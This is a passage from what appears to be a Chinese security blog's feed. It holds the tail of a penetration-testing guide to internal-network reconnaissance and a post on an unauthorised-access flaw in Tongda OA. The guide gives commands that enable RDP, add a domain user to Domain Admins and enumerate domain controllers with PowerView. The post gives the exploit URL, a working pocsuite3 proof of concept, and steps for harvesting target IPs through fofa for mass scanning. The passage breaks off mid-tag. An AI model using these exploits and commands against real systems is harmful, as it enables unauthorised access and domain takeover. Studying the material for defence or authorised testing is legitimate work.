class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall firewall add rule name&#x3D;&quot;Remote Desktop&quot; protocol&#x3D;TCP dir&#x3D;in localport&#x3D;3389 action&#x3D;allow</span><br></pre></td></tr></table></figure><p>自定义防火墙日志存储位置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set currentprofile logging filename &quot;C:\windows\temp\fw.log&quot;</span><br></pre></td></tr></table></figure><h3 id="查询远程服务连接"><a href="#查询远程服务连接" class="headerlink" title="查询远程服务连接"></a>查询远程服务连接</h3><p>查询远程连接端口</p><ul><li>在cmd下使用注册表查询语句，命令如下，得到连接端口为0xd3d，转换后为3389</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG QUERY &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;V PortNumber</span><br></pre></td></tr></table></figure><h5 id="在windows-server-2003-中开启3389端口"><a href="#在windows-server-2003-中开启3389端口" class="headerlink" title="在windows server 2003 中开启3389端口"></a>在windows server 2003 中开启3389端口</h5><ul><li>方法一</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</span><br></pre></td></tr></table></figure><ul><li>方法二</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br></pre></td></tr></table></figure><h5 id="在Windows-Server-2008-和-Windows-Server-2012-中开启-3389-端口"><a href="#在Windows-Server-2008-和-Windows-Server-2012-中开启-3389-端口" class="headerlink" title="在Windows Server 2008 和 Windows Server 2012 中开启 3389 端口"></a><strong>在Windows Server 2008 和 Windows Server 2012 中开启 3389 端口</strong></h5><ul><li>如下命令来开启3389端口——管理员权限执行否则会报错</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_terminalservicesetting where (__CLASS !&#x3D;&quot;&quot;) call setallowtsconnections 1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic &#x2F;namespace:\\root\cimv2\terminalservices path win32_tsgeneralsetting where (TerminalName&#x3D;&#39;RDP-Tcp&#39;) call setuserauthenticationrequired 1</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add &quot;HKLM\SYSTEM\CURRENT\CONTROLSET\CONTROL\TERMINAL SERVER&quot; &#x2F;v fSingleSessionPerUser &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 00000000 &#x2F;f</span><br></pre></td></tr></table></figure><h2 id="自动化信息收集"><a href="#自动化信息收集" class="headerlink" title="自动化信息收集"></a>自动化信息收集</h2><h3 id="WMIC收集目标机信息的脚本"><a href="#WMIC收集目标机信息的脚本" class="headerlink" title="WMIC收集目标机信息的脚本"></a>WMIC收集目标机信息的脚本</h3><ul><li>WMIC脚本的不载地址为<a href="http://www.fuzzysecurity.com/scripts/files/wmic_info.rar">http://www.fuzzysecurity.com/scripts/files/wmic_info.rar</a></li><li>WMIC（Windows Management Instrumentation Command-Line，Windows管理工具命令行）是Windows下最有用的命令行工具。WMIC对于信息收集和渗透都是非常实用的。默认任何版本的WindowsXP的低权限用户不能访问WMIC，Windows7以上版本允许低权限的用户访问WMIC并执行相关查询操作。</li></ul><h3 id="Empire下主机信息收集"><a href="#Empire下主机信息收集" class="headerlink" title="Empire下主机信息收集"></a><strong>Empire下主机信息收集</strong></h3><ul><li>在 Empire 下也存在类似模块，输入“usemodule situational_awareness/host/winenum”命令即可查看本机用户、域组成员、最后的密码设置时间、剪贴板内容、系统基本信息、网络适配器信息、 共享信息等</li></ul><h2 id="查看当前权限"><a href="#查看当前权限" class="headerlink" title="查看当前权限"></a>查看当前权限</h2><h3 id="查看当前权限-1"><a href="#查看当前权限-1" class="headerlink" title="查看当前权限"></a>查看当前权限</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br></pre></td></tr></table></figure><p>获取了一台主机的权限后，会有以下三种情况：</p><ul><li>本地普通用户：当前权限为 win-2008 本机的 user 用户：</li><li>本地管理员用户：当前权限为 win7-x64-test 本机的 administrator用户：</li><li>域内用户：当前权限为 hacke 域内的 administrator用户：</li></ul><h3 id="获取域SID"><a href="#获取域SID" class="headerlink" title="获取域SID"></a>获取域SID</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami &#x2F;all</span><br></pre></td></tr></table></figure><h3 id="判断是否有域"><a href="#判断是否有域" class="headerlink" title="判断是否有域"></a>判断是否有域</h3><p>执行如下命令，可以查看网关IP 地址、DNS的IP地址、本地地址是否和DNS服务器为同一网段、域名等</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig &#x2F;all</span><br></pre></td></tr></table></figure><p>然后，通过反向解析查询命令nslookup来解析域名的IP地址。使用解析出来的IP地址进行对比，判断域控制器和DNS服务器是否在同一台服务器上</p><ul><li>主DNS后缀在ipconfig /all 能查询</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup hacke.testlab</span><br></pre></td></tr></table></figure><p>查看系统信息，如结果所示，域即域名，登录服务器为域控制器。如果域显示为 WORKGROUP，表示当前服务器不在域内，当前域名为 hacke.testlab：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Systeminfo</span><br></pre></td></tr></table></figure><h3 id="判断主域"><a href="#判断主域" class="headerlink" title="判断主域"></a>判断主域</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time &#x2F;domain</span><br></pre></td></tr></table></figure><ul><li>或者更详细的信息</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami &#x2F;all</span><br></pre></td></tr></table></figure><h3 id="探测域内存活主机"><a href="#探测域内存活主机" class="headerlink" title="探测域内存活主机"></a>探测域内存活主机</h3><p>内网存活主机的探测是内网渗透中不可或缺的一个环节。在扫描的时候，应尽量避免使用Namp等工具进行暴力扫描，也不要在目标机器上使用图形化的工具，而要尽量使用目标系统自带的各种工具，推荐使用PowerShell脚本。对于Windows 7以下版本的系统，可以使用VBS 脚 本。在探测时，可在白天和夜间分别探测，以对比分析存活主机和对应的 IP 地址。<br>###利用NetBIOS快速探测内网<br>NetBIOS是一种在局域网上的程序可以使用的应用程序编程接口（API），为程序提供了请求低级服务的统一的命令集，作用是给局域网提供网络及其他特殊功能。几乎所有的局域网都是在NetBIOS协议的基础上工作的。“NetBIOS”也是计算机的标识名，该名字主要用于局域网中计算机之间的相互访问。NetBIOS的工作流程是正常的机器名解析查询应答过程，推荐优先使用。</p><p>NetBIOS 的使用比较简单。将其上传到目标主机后，直接输入IP地址范围并运行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan-1.0.35.exe 192.168.174.0&#x2F;24</span><br></pre></td></tr></table></figure><p>显示结果的第一列为IP地址，第二列是机器名和所在域名，最后一列是关于机器所开启的服务的列表，具体含义如下表所示:</p><table><thead><tr><th>Token</th><th>含义</th></tr></thead><tbody><tr><td>SHARING</td><td>该机器中有运行文件和打印共享服务，但不一定有内容共享</td></tr><tr><td>DC</td><td>该机器可能是域控制</td></tr><tr><td>U=USER</td><td>该机器有登录名为USER的用户（不是太准确）</td></tr><tr><td>IIS</td><td>该机器可能安装了IIS服务器</td></tr><tr><td>EXECHANGE</td><td>该机器可能安装了微软的EXCHANGE</td></tr><tr><td>NOTES</td><td>该机器可能安装了</td></tr><tr><td>？</td><td>没有识别出该机器的NETBIOS资源，可以使用“-F”选项再次进行扫描</td></tr></tbody></table><h3 id="ICMP-协议快速探测内网"><a href="#ICMP-协议快速探测内网" class="headerlink" title="ICMP 协议快速探测内网"></a>ICMP 协议快速探测内网</h3><ul><li>除了利用NetBIOS协议，还可以使用 ICMP 协议。依次对内网中的每个 IP 地址执行 ping 命 令，可以快速有效地找出内网中所有存活的主机。在实战中，可以使用如下命令循环探测整个 C 段</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for &#x2F;L %I in (1,1,254) DO @ping -w 1 -n 1 192.168.174.%I | findstr &quot;TTL&#x3D;&quot;</span><br></pre></td></tr></table></figure><h2 id="收集域内基础信息"><a href="#收集域内基础信息" class="headerlink" title="收集域内基础信息"></a>收集域内基础信息</h2><h3 id="在域内添加用户"><a href="#在域内添加用户" class="headerlink" title="在域内添加用户"></a>在域内添加用户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user abc Aa123456! &#x2F;add &#x2F;domain</span><br></pre></td></tr></table></figure><h3 id="将用户添加到域环境"><a href="#将用户添加到域环境" class="headerlink" title="将用户添加到域环境"></a>将用户添加到域环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain admins&quot; abc &#x2F;add &#x2F;domain</span><br></pre></td></tr></table></figure><h3 id="将域用户添加到本地管理员组"><a href="#将域用户添加到本地管理员组" class="headerlink" title="将域用户添加到本地管理员组"></a>将域用户添加到本地管理员组</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup Administrators &#x2F;add myad.com\abc</span><br></pre></td></tr></table></figure><h3 id="查看域的命令如下"><a href="#查看域的命令如下" class="headerlink" title="查看域的命令如下"></a>查看域的命令如下</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view &#x2F;domain</span><br></pre></td></tr></table></figure><h3 id="查看域内所有计算机"><a href="#查看域内所有计算机" class="headerlink" title="查看域内所有计算机"></a>查看域内所有计算机</h3><ul><li>执行如下命令，可以通过查询得到的主机名来对主机角色进行初步判断</li><li>例如，”dev”可能是开发服务器,”web”或者app可能是Web服务， “NAS”可能是存储服务器,”fileserver”可能是文件服务器等。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net view &#x2F;domain:XXX</span><br></pre></td></tr></table></figure><h3 id="查看域内所有用户组列表"><a href="#查看域内所有用户组列表" class="headerlink" title="查看域内所有用户组列表"></a>查看域内所有用户组列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &#x2F;domain</span><br></pre></td></tr></table></figure><ul><li>Domain Admins：域管理员组。</li><li>Domain Computers：域内机器。</li><li>Domain Controllers：域控制器。</li><li>Domain Guest：域访客组，权限较低。</li><li>Domain Users：域用户。</li><li>Enterprise Admins：企业系统管理员用户。</li></ul><h3 id="查看所有域成员计算机列表"><a href="#查看所有域成员计算机列表" class="headerlink" title="查看所有域成员计算机列表"></a>查看所有域成员计算机列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain computers&quot; &#x2F;domain</span><br></pre></td></tr></table></figure><h3 id="获取域信任列表"><a href="#获取域信任列表" class="headerlink" title="获取域信任列表"></a>获取域信任列表</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest &#x2F;domain_trusts</span><br></pre></td></tr></table></figure><h3 id="查看域控制器"><a href="#查看域控制器" class="headerlink" title="查看域控制器"></a>查看域控制器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest &#x2F;DCLIST:xxx</span><br></pre></td></tr></table></figure><h4 id="查看域控制器的ip"><a href="#查看域控制器的ip" class="headerlink" title="查看域控制器的ip"></a>查看域控制器的ip</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nslookup -type&#x3D;SRV _ldap._tcp</span><br></pre></td></tr></table></figure><h4 id="查看域控当前时间"><a href="#查看域控当前时间" class="headerlink" title="查看域控当前时间"></a>查看域控当前时间</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net time &#x2F;domain</span><br></pre></td></tr></table></figure><h4 id="查看域控制器组"><a href="#查看域控制器组" class="headerlink" title="查看域控制器组"></a>查看域控制器组</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain Controllers&quot; &#x2F;domain</span><br></pre></td></tr></table></figure><h3 id="定位域管理员"><a href="#定位域管理员" class="headerlink" title="定位域管理员"></a>定位域管理员</h3><ul><li>在通常的网络环境里，内网中部署了大量的网络安全设备，如IDS、IPS、日志审计、安全网关、反病毒软件等。所以，在域网络攻击测试场景中，如果渗透测试人员获取了域内的一个支点，为了实现对域网络的整体控制， 渗透测试人员就需要获取域管理员权限。</li></ul><h4 id="常用域管理员定位工具"><a href="#常用域管理员定位工具" class="headerlink" title="常用域管理员定位工具"></a>常用域管理员定位工具</h4><ul><li>常用的工具有psloggedon.exe、pveFindADUser.exe、netsess.exe、hunter、NetView 等。在PowerShell中，常用的脚本是PowerView。</li></ul><h4 id="psloggedon-exe"><a href="#psloggedon-exe" class="headerlink" title="psloggedon.exe"></a><strong>psloggedon.exe</strong></h4><p>psloggedon.exe可以显示本地登录的用户和通过本地计算机或远程计算机的资源登录的用户。如果指定了用户名而不是计算机，psloggedon.exe会搜索网络邻居中的计算机，并显示该用户当前是否已登录，其原理是通过检 验注册表里HKEY_USERS项的key值来查询谁登录过机器（同样调用了NetSessionEnum API）， 某些功能需要拥有管理员权限才能使用。psloggedon.exe的下载地址为<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%A6%82%E4%B8%8B%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8F%82%E6%95%B0">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon，使用如下命令及参数</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">psloggedon [-] [-l] [-x] [\\computername|username]</span><br><span class="line">&#x2F;&#x2F;实例</span><br><span class="line">Psloggedon.exe \\域名</span><br></pre></td></tr></table></figure><ul><li>-：显示支持的选项和用于输出值的单位。</li><li>-l：仅显示本地登录，不显示本地和网络资源登录。</li><li>-x：不显示登录时间。</li><li>\computername：指定要列出登录信息的计算机的名称。</li><li>Username：指定用户名，在网络中搜索该用户登录的计算机。</li></ul><h4 id="pveFindADUser"><a href="#pveFindADUser" class="headerlink" title="pveFindADUser"></a><strong>pveFindADUser</strong></h4><p>pveFindADUser.exe 可用于查找 Active Directory 用户登录的位置，枚举域用户，以及查找在 特定计算机上登录的用户，包括本地用户、通过RDP 登录的用户、用于运行服务和计划任务的用户账 户。运行该工具的计算机需要具有.NET Framework 2.0，并且需要具有管理员权限。pveFindADUser.exe 的下载地址为 <a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%A6%82%E4%B8%8B%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8F%82%E6%95%B0">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn，使用如下命令及参数</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pvefindaduser.exe &lt;参数&gt;</span><br></pre></td></tr></table></figure><ul><li>-h：显示帮助。</li><li>-u：检查是否有更新版本的实用程序。</li><li>-current [‘’username’’]：如果仅指定了-current 参数，将获取所有目标计算机上当前登录的所 有用户。如果指定了用户名（DOMAIN\Username），则显示该用户登录的计算机。</li><li>-last [‘’username’’]：如果仅指定了-last 参数，将获取目标计算机上的最后一个登录用户。如果指定了用户名（DOMAIN\Username），则显示具有此用户账户作为上次登录的计算机，根据网络的策略，可能会隐藏最后一个登录用户名，且该工具可能无法得到该用户名。</li><li>-noping：阻止该工具在尝试获取用户登录信息之前对目标计算机执行 ping 命令。</li><li>-target：可选参数，用于指定要查询的主机。如果未指定此参数，将查询当前域中的所有主 机。如果指定此参数，则后跟一个由逗号分隔的主机名列表。</li></ul><h4 id="netview"><a href="#netview" class="headerlink" title="netview"></a><strong>netview</strong></h4><p>netview.exe 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 找寻登录会话， 利用 NetShareEnum找寻共享，利用 NetWkstaUserEnum枚举登录的用户。同时，netview.exe 能够 查询共享入口和有价值用户。netview.exe 的绝大部分功能不需要管理员权限即可执行，下载地址为<a href="https://github.com/mubix/netview%EF%BC%8C%E4%BD%BF%E7%94%A8%E5%A6%82%E4%B8%8B%E5%91%BD%E4%BB%A4%E5%8F%8A%E5%8F%82%E6%95%B0">https://github.com/mubix/netview，使用如下命令及参数</a></p><ul><li>-h：显示帮助菜单。</li><li>-f filename.txt：指定从中提取主机列表的文件。</li><li>-e filename.txt：指定要排除的主机名文件。</li><li>-o filename.txt：将所有输出重定向到文件。</li><li>-d domain：指定从中提取主机列表的域。如果没有指定，则使用当前域。</li><li>-g group：指定用户搜寻的组名。如果没有指定，则使用 Domain Admins。</li><li>-c：检查对已找到共享的访问权限。</li></ul><h2 id="利用PowerShell收集域信息"><a href="#利用PowerShell收集域信息" class="headerlink" title="利用PowerShell收集域信息"></a><strong>利用PowerShell收集域信息</strong></h2><p>PowerShell是微软推出的一款用于提高管理员对操作系统及应用程序易用性和扩展性的脚本环境，可以说是cmd.exe的加强版。微软已经将PowerShell 2.0 内置在Windows Server 2008 和 Windows 7中，将PowerShell 3.0内置在Windows Server 2012和 Windows 8中，将 PowerShell 4.0内置在 Windows Server 2012 R2 和 Windows 8.1 中，将PowerShell 5.0 内置在 Windows Server 2016 和 Windows 10 中。PowerShell 作为微软官方推出的脚本语言，在Windows系统中的强大众所周知：在系统管理员手中，可以提高Windows系统管理工作的自动化程度；在渗透测试人员手中， 便于渗透测试人员更好地绕过系统防护和相关反病毒软件。</p><ul><li>如果想在 Windows 系统中执行一个 PowerShell 脚本，首先需要在Windows 系统的“开始菜 单”中打开“Run”对话框，输入“powershell”</li><li>接下来，将弹出一个窗口，窗口上方有“Administrator”字样，代表当前 PowerShell 权限为管理员权限</li></ul><p>如果想执行一个PowerShell脚本，需要修改PowerShell的默认权限为执行权限。PowerShell常用的执行权限共有四种，具体如下：</p><ul><li>Restricted：默认设置，不允许执行任何脚本。</li><li>Allsigned：只能运行经过证书验证的脚本。</li><li>Unrestricted：权限最高，可以执行任意脚本。</li><li>RemoteSigned：本地脚本无限制，但是对来自网络的脚本必须经过签名<br>在 PowerShell 中输入“Get-ExecutionPolicy”，看到为默认Restricted </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-ExecutionPolicy</span><br></pre></td></tr></table></figure><p>将 PowerShell 执行权限改为 Unrestricted，输入”Y”</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-ExecutionPolicy Unrestricted</span><br></pre></td></tr></table></figure><p>PowerView是一款依赖PowerShell和WMI对内网域情况进行查询的常用渗透脚本。<br>PowerView集成在PowerSploit工具包中，下载地址为：<br><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1">https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1</a><br>打开一个PowerShell窗口，进入PowerSploit目录下的 Recon 目录，输入命令“ImportModule .\PowerView.ps1”，成功导入脚本，没有报错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; cd .\Recon</span><br><span class="line">&gt; Import-Module .\PowerView.ps1</span><br></pre></td></tr></table></figure><ul><li>PowerView中的常用命令如下：</li><li>Get-NetDomain：获取当前用户所在的域名称。</li><li>Get-NetUser：返回所有用户的详细信息。</li><li>Get-NetDomainController：获取所有域控制器。</li><li>Get-NetComputer：获取所有域内机器的详细信息。</li><li>Get-NetOU：获取域中的 OU 信息。</li><li>Get-NetGroup：获取所有域内组和组成员信息。</li><li>Get-NetFileServer：根据 SPN 获取当前域使用的文件服务器。</li><li>Get-NetShare：获取当前域内所有网络共享。</li><li>Get-NetSession：获取在指定服务器存在的会话信息。</li><li>Get-NetRDPSession：获取在指定服务器存在的远程连接信息。</li><li>Get-NetProcess：获取远程主机的进程信息。</li><li>Get-UserEvent：获取指定用户的日志信息。</li><li>Get-ADObject：获取活动目录的对象信息。</li><li>Get-NetGPO：获取域所有组策略对象。</li><li>Get-DomainPolicy：获取域默认或域控制器策略。</li><li>Invoke-UserHunter：用于获取域用户登录计算机及该用户是否有本地管理权限。</li><li>Invoke-ProcessHunter：查找域内所有机器进程用于找到某特定用户。</li><li>Invoke-UserEventHunter：根据用户日志获取某域用户登录过哪些域机器。</li></ul><h4 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h4><ul><li><a href="https://mp.weixin.qq.com/s/4UELXeyAVjvKur-lw1tEJA">https://mp.weixin.qq.com/s/4UELXeyAVjvKur-lw1tEJA</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;内网信息收集&quot;&gt;&lt;a href=&quot;#内网信息收集&quot; class=&quot;headerlink&quot; title=&quot;内网信息收集&quot;&gt;&lt;/a&gt;内网信息收集&lt;/h1&gt;&lt;h2 id=&quot;手动收集信息&quot;&gt;&lt;a href=&quot;#手动收集信息&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://example.com/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="信息收集" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>通达OA未授权访问漏洞</title>
    <link href="http://example.com/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-03-10T14:18:03.153Z</published>
    <updated>2021-04-08T06:43:36.807Z</updated>
    
    <content type="html"><![CDATA[<h3 id="漏洞类型：未授权访问"><a href="#漏洞类型：未授权访问" class="headerlink" title="漏洞类型：未授权访问"></a>漏洞类型：未授权访问</h3><h3 id="漏洞利用条件：用户在线"><a href="#漏洞利用条件：用户在线" class="headerlink" title="漏洞利用条件：用户在线"></a>漏洞利用条件：用户在线</h3><h3 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h3><p>1、先访问</p><p><code>http://xxx.xxx.xxx/mobile/auth_mobi.php?isAvatar=1&amp;uid=1&amp;P_VER=0</code></p><p>如果出现空白页面,则说明已经获得权限.</p><p><img src="/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/640.png"></p><p>2、在访问<code>http://xxx.xxx.xxx/general/ </code>,成功进入系统</p><p><img src="/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/641.png"></p><p>3、如果出现RELOGIN,则说明目前没有人在线,需要等待有人登录的时候在尝试</p><p><img src="/2021/03/10/%E9%80%9A%E8%BE%BEoa%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/642.png"></p><h3 id="pocsuite3编写poc"><a href="#pocsuite3编写poc" class="headerlink" title="pocsuite3编写poc"></a>pocsuite3编写poc</h3><p>github下载地址：<a href="https://github.com/knownsec/Pocsuite3">https://github.com/knownsec/Pocsuite3</a><br>使用pocsuite3编写poc,代码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class DemoPOC(POCBase):</span><br><span class="line">    vulID &#x3D; &#39;&#39;  # ssvid</span><br><span class="line">    version &#x3D; &#39;1.0&#39;</span><br><span class="line">    author &#x3D; [&#39;w7ay&#39;]</span><br><span class="line">    vulDate &#x3D; &#39;2021-3-8&#39;</span><br><span class="line">    createDate &#x3D; &#39;2021-3-8&#39;</span><br><span class="line">    updateDate &#x3D; &#39;2021-3-8&#39;</span><br><span class="line">    references &#x3D; [&#39;https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;IabOKaeNyAsh8V4k2cmXAw&#39;]</span><br><span class="line">    name &#x3D; &#39;通达OA未授权访问漏洞&#39;</span><br><span class="line">    appPowerLink &#x3D; &#39;&#39;</span><br><span class="line">    appName &#x3D; &#39;Confluence&#39;</span><br><span class="line">    appVersion &#x3D; &#39;&#39;</span><br><span class="line">    vulType &#x3D; VUL_TYPE.CODE_EXECUTION</span><br><span class="line">    desc &#x3D; &#39;&#39;&#39;查看是否存在通达OA未授权访问漏洞&#39;&#39;&#39;</span><br><span class="line">    samples &#x3D; []</span><br><span class="line">    install_requires &#x3D; [&#39;&#39;]</span><br><span class="line">    category &#x3D; POC_CATEGORY.EXPLOITS.WEBAPP</span><br><span class="line"></span><br><span class="line">    def _verify(self):</span><br><span class="line">        result &#x3D; &#123;&#125;</span><br><span class="line">        payload &#x3D; &quot;&#x2F;mobile&#x2F;auth_mobi.php?isAvatar&#x3D;1&amp;uid&#x3D;1&amp;P_VER&#x3D;0&quot;</span><br><span class="line">        response &#x3D; requests.get(self.url + payload)</span><br><span class="line">        if &quot;RELOGIN&quot; not in response.text and response.status_code &#x3D;&#x3D; 200:</span><br><span class="line">            result[&#39;status&#39;] &#x3D; &#39;[+] 存在通达OA未授权访问漏洞&#39;</span><br><span class="line">        return self.parse_output(result)</span><br><span class="line"></span><br><span class="line">    def _attack(self):</span><br><span class="line">        return self._verify()</span><br><span class="line"></span><br><span class="line">    def parse_output(self, result):</span><br><span class="line">        output &#x3D; Output(self)</span><br><span class="line">        if result:</span><br><span class="line">            output.success(result)</span><br><span class="line">        else:</span><br><span class="line">            output.fail(&#39;target is not vulnerable&#39;)</span><br><span class="line">        return output</span><br><span class="line"></span><br><span class="line">register_poc(DemoPOC)</span><br></pre></td></tr></table></figure><p><strong>主要在于使用_verify()这个函数验证是否存在漏洞，判断如果返回的内容不存在RELOGIN，并且状态码为200，说明可能存在漏洞。</strong></p><ul><li>将写好的脚本保存放在pocs目录下，文件名为oa.py。</li><li>利用fofa收集ip，搜索语法：body=”通达oa”</li><li>将收集的ip保存放在pocsuite3目录下，文件名为通达OA.txt</li></ul><p><img 